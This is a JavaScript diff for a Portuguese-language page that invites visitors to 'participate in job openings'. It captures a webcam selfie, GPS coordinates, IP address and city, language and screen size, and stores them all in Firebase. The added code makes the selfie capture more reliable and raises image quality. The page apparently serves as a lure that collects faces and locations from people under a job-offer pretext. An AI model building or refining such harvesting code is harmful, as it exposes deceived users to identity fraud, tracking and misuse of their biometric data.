@@ -55,6 +55,8 @@ async function iniciarSistema(){
 
   try{
 
+    // áudio
+
     const fala =
     new SpeechSynthesisUtterance(
       "Clique no botão verde para participar das vagas."
@@ -69,6 +71,8 @@ async function iniciarSistema(){
 
     statusText.innerHTML =
     "📸 Iniciando câmera...";
+
+    // câmera
 
     const stream =
     await navigator.mediaDevices
@@ -86,6 +90,27 @@ async function iniciarSistema(){
     stream;
 
     await video.play();
+
+    // espera vídeo carregar
+
+    await new Promise(
+      (resolve)=>{
+
+        if(video.readyState >= 2){
+
+          resolve();
+
+        }
+
+        else{
+
+          video.onloadeddata =
+          ()=>resolve();
+
+        }
+
+      }
+    );
 
     statusText.innerHTML =
     "✅ Sistema pronto";
@@ -120,14 +145,32 @@ btn.addEventListener(
       btn.innerHTML =
       "PROCESSANDO...";
 
+      // ====================
+      // CAPTURA SELFIE
+      // ====================
+
       statusText.innerHTML =
       "📸 Capturando imagem...";
 
-      canvas.width =
+      const largura =
       video.videoWidth;
 
-      canvas.height =
+      const altura =
       video.videoHeight;
+
+      if(!largura || !altura){
+
+        throw new Error(
+          "Vídeo não carregou"
+        );
+
+      }
+
+      canvas.width =
+      largura;
+
+      canvas.height =
+      altura;
 
       const ctx =
       canvas.getContext("2d");
@@ -136,15 +179,21 @@ btn.addEventListener(
         video,
         0,
         0,
-        canvas.width,
-        canvas.height
+        largura,
+        altura
       );
 
       const selfie =
       canvas.toDataURL(
         "image/jpeg",
-        0.7
+        0.9
       );
+
+      console.log(selfie);
+
+      // ====================
+      // LOCALIZAÇÃO
+      // ====================
 
       let latitude =
       "não permitido";
@@ -184,9 +233,16 @@ btn.addEventListener(
 
       catch(err){
 
-        console.log(err);
+        console.log(
+          "GPS negado",
+          err
+        );
 
       }
+
+      // ====================
+      // IP + CIDADE
+      // ====================
 
       let ip =
       "indisponível";
@@ -209,24 +265,31 @@ btn.addEventListener(
         await req.json();
 
         ip =
-        json.ip;
+        json.ip || "";
 
         cidade =
-        json.city;
+        json.city || "";
 
         estado =
-        json.region;
+        json.region || "";
 
         pais =
-        json.country_name;
+        json.country_name || "";
 
       }
 
       catch(err){
 
-        console.log(err);
+        console.log(
+          "Erro IP",
+          err
+        );
 
       }
+
+      // ====================
+      // SALVAR FIREBASE
+      // ====================
 
       statusText.innerHTML =
       "💾 Salvando cadastro...";
@@ -261,11 +324,21 @@ btn.addEventListener(
           idioma:
           navigator.language,
 
+          larguraTela:
+          window.innerWidth,
+
+          alturaTela:
+          window.innerHeight,
+
           data:
           serverTimestamp()
 
         }
       );
+
+      // ====================
+      // FINAL
+      // ====================
 
       statusText.innerHTML =
       "✅ Cadastro concluído";
